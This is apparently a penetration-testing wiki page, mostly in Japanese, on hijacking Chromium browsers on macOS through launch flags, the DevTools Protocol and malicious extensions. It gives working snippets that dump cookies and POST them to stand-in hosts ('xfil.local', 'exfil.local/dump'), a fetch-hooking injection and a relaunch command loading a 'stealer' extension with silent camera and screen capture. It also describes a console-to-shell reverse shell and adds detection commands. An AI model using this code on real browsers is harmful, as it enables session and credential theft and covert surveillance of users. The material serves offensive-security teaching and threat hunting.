# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

Google Chrome、Microsoft Edge、Brave、Arc、Vivaldi、Opera などの Chromium-based browsers は、同じ command-line switches、preference files、DevTools automation interfaces を使用します。macOS では、GUI access を持つすべての user が既存の browser session を終了し、target の entitlements で実行される任意の flags、extensions、DevTools endpoints を指定して再起動できます。

#### macOS で custom flags を指定して Chromium を起動する

macOS は Chromium profile ごとに単一の UI instance を保持するため、instrumentation には通常、browser を強制終了する必要があります（たとえば `osascript -e 'tell application "Google Chrome" to quit'`）。Attackers は通常、`open -na "Google Chrome" --args <flags>` を使用して再起動します。これにより、app bundle を変更せずに arguments を inject できます。この command を user LaunchAgent（`~/Library/LaunchAgents/*.plist`）または login hook 内でラップすると、reboot/logoff 後にも改変された browser が確実に再起動されます。

#### `--load-extension` Flag

`--load-extension` flag は unpacked extensions（comma-separated paths）を自動的に load します。`--disable-extensions-except` と組み合わせることで、正規の extensions を block し、payload のみを強制的に実行できます。Malicious extensions は `debugger`、`webRequest`、`cookies` などの影響の大きい permissions を要求し、DevTools protocols への pivot、CSP headers の patch、HTTPS の downgrade、browser 起動直後の session material の exfiltrate を可能にします。

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

これらの switches は、TCP または pipe 経由で Chrome DevTools Protocol（CDP）を expose し、external tooling から browser を操作できるようにします。Google はこの interface が infostealer に広く abuse されていることを確認しており、Chrome 136（2025 年 3 月）以降、browser が標準以外の `--user-data-dir` で起動されない限り、default profile ではこれらの switches は無視されます。これにより実際の profiles では App-Bound Encryption が適用されますが、attackers は依然として fresh profile を spawn し、その中で victim に authenticate させ（phishing/triage assistance）、CDP 経由で cookies、tokens、device trust states、WebAuthn registrations を harvest できます。<sup>[5]</sup>

#### `--user-data-dir` Flag

この flag は browser profile 全体（History、Cookies、Login Data、Preference files など）を attacker-controlled path に redirect します。modern Chrome builds で `--remote-debugging-port` と組み合わせる場合に必須であり、tampered profile を isolate することで、security prompts を disable し、extensions を auto-install し、default schemes を変更する事前設定済みの `Preferences` または `Secure Preferences` files を配置できます。

#### `--use-fake-ui-for-media-stream` Flag

この switch は camera/mic の permission prompt を bypass するため、`getUserMedia` を呼び出す page は即座に access を取得します。`--auto-select-desktop-capture-source="Entire Screen"`、`--kiosk` などの flags、または CDP の `Browser.grantPermissions` commands と組み合わせることで、user interaction なしに audio/video の capture、desk-share、WebRTC permission checks の通過を silently 実行できます。

## 実際に確認されている Delivery & Relaunch Patterns

CDP abuse は、initial payload ではなく、一般的に **post-exploitation** stage です。最近の macOS developer-targeting campaign では、poisoned Xcode **`Run Script` build phase**（`PBXShellScriptBuildPhase`）が使用され、victim が project を単に clone または open したときではなく、**build** したときだけ code が実行されました。最初の execution 後、malware は他の `.xcodeproj` trees にも感染し、malicious Git `pre-commit` hooks を追加し、ZIP archives 内からさらに Xcode projects を search しました。<sup>[3]</sup>

Chromium abuse において重要なのは、attacker が browser binary 自体に patch を適用する必要がない点です。代わりに、短時間だけ実行される build-phase / `osascript` stager が **browser wrapper**（LaunchAgent、login item、Dock entry、trojanized app launcher など）を install し、user が起動するたびに attacker-controlled flags を指定して legitimate browser を reopen できます。<sup>[3]</sup>

> [!TIP]
> Developer endpoints では、`.pbxproj` files、`.git/hooks/pre-commit`、および `.xcodeproj` を含む ZIPs を inspect し、予期しない `curl`、`osascript`、`xxd`、nested `base64`、または Chrome relaunch logic がないか確認してください。

## Remote Debugging & DevTools Protocol Abuse

Chrome が専用の `--user-data-dir` と `--remote-debugging-port` で再起動された後は、CDP 経由で attach し（たとえば `chrome-remote-interface`、`puppeteer`、`playwright` を使用）、high-privilege workflows を script 化できます。

- **Cookie/session theft:** `Network.getAllCookies` と `Storage.getCookies` は、App-Bound encryption により通常は filesystem access が block される場合でも、HttpOnly values を return します。これは CDP が実行中の browser に decrypt を要求するためです。
- **Permission tampering:** `Browser.grantPermissions` と `Emulation.setGeolocationOverride` により、camera/mic prompts を bypass したり（特に `--use-fake-ui-for-media-stream` と組み合わせた場合）、location-based security checks を falsify したりできます。
- **Keystroke/script injection:** `Runtime.evaluate` は active tab 内で arbitrary JavaScript を execute し、credential lifting、DOM patching、navigation 後も survive する persistence beacons の inject を可能にします。<sup>[1]</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` と `Fetch.enable` は、disk artifacts に触れることなく、authenticated requests/responses を real time で intercept します。
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Chrome 136ではデフォルトprofile上のCDPがブロックされるため、被害者が既に使用している `~/Library/Application Support/Google/Chrome` directoryをstaging用パスにコピーしても、Cookieはもはや復号されません。代わりに、instrumented profile内で認証するようユーザーをsocial-engineerする（例:「役に立つ」support session）か、CDPで制御するnetwork hookを介して転送中のMFA tokenをcaptureします。<sup>[5]</sup>

### XCSSET-style CDP Backdoor Chain

実用的なmalware patternは次のとおりです。

1. Chromeが起動するたびに、userland implantまたはwrapperをrestartする。
2. `--remote-debugging-port=<port>`と、Chrome 136以降では通常、対応するnon-default `--user-data-dir=<dir>`を指定してlegitimate browserをspawnする。
3. local CDP WebSocketにconnectし、`Page.addScriptToEvaluateOnNewDocument`でpre-document hookをregisterするhelperをstartする。<sup>[2]</sup>

そのhelperはsite codeが実行される**前**にJavaScriptをinjectできるため、disk上のfileをpatchせずに`window.fetch`、`XMLHttpRequest`、wallet provider、またはautofill flowへhookを仕掛けるのに適しています。<sup>[3]</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
より強力な亜種では、browserを**host command bridge**へと変化させます。注入されたJavaScriptがdelimiter-taggedな`console.log`を出力し、ローカルhelperが`Runtime.consoleAPICalled`を監視してmarkerを除去し、残りの内容をhost shell経由（たとえばGoの`exec.Command`）で実行し、攻撃者のWebSocket経由でstdout/stderrを返します。これにより、tab-levelのscript executionが、ほぼfilelessなreverse shellへと拡張されます。<sup>[3]</sup>

## Debugger API経由のExtension-Based Injection

2023年の「Chrowned by an Extension」researchでは、悪意のあるextensionが`chrome.debugger` APIを使用して任意のtabにattachし、`--remote-debugging-port`と同じDevTools権限を取得できることが実証されました。<sup>[6]</sup>これにより、元々のisolation assumptions（extensionsは自身のcontext内に留まる）が破られ、以下が可能になります。

- `Network.getAllCookies`/`Fetch.getResponseBody`を使用した、ユーザーに気付かれないcookieおよびcredentialの窃取。
- site permissions（camera、microphone、geolocation）の変更およびsecurity interstitialのbypass。これにより、phishing pageがChrome dialogになりすますことが可能になります。
- `Page.handleJavaScriptDialog`、`Page.setDownloadBehavior`、`Security.handleCertificateError`をプログラムで操作することによる、TLS warning、download、またはWebAuthn promptのon-path tampering。

`--load-extension`/`--disable-extensions-except`を使用してextensionをloadすれば、ユーザーによるinteractionは必要ありません。APIをweaponizeする最小限のbackground scriptは次のようになります。
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
この extension は `Debugger.paused` events を subscribe して JavaScript variables を読み取り、inline scripts を patch したり、navigation 後も維持される custom breakpoints を設定したりすることもできます。すべてがユーザーの GUI session 内で実行されるため、Gatekeeper と TCC は trigger されません。そのため、この technique はすでに user context での実行を達成した malware に適しています。<sup>[6]</sup>

## Detection & Hunting

- `--remote-debugging-port`、`--remote-debugging-pipe`、または suspicious な `--user-data-dir` を指定して起動された Chromium browsers を alert します。特に parent が `bash`、`sh`、`osascript`、`xcodebuild`、または LaunchAgent helper の場合は注意が必要です。
- helper が local CDP WebSocket を開き、`Page.addScriptToEvaluateOnNewDocument` を register し、その後 long-lived な outbound WebSocket/HTTPS connection を確立する短い chain を探します。
- browser の `Runtime.consoleAPICalled` activity と、attacker-supplied commands を実行する child shells または helper processes を相関させ、console-to-shell bridges を hunt します。
- developer Macs では、`.pbxproj` の `PBXShellScriptBuildPhase` entries、Git の `pre-commit` hooks、Dock/login item relaunchers、および browser wrapper installation を含む ZIP-contained Xcode projects を review します。
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### ツール

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - payload extensions を使用した Chromium の起動を自動化し、interactive CDP hooks を公開します。
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operators 向けに traffic interception と browser instrumentation に重点を置いた類似ツールです。
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - `--remote-debugging-port` instance が稼働した後に、Chrome DevTools Protocol dumps（cookies、DOM、permissions）を script 化する Node.js library です。

### 例
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
ツールのリンクでさらに多くの例を確認できます。

## References

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: The Latest XCSSET Versionの詳細分析 - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [X上のRon Masas (@RonMasas)](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [セキュリティ向上のためのリモートデバッグスイッチの変更 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [拡張機能にChrownedされる: Debugger APIを介したChrome DevTools Protocolの悪用 (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
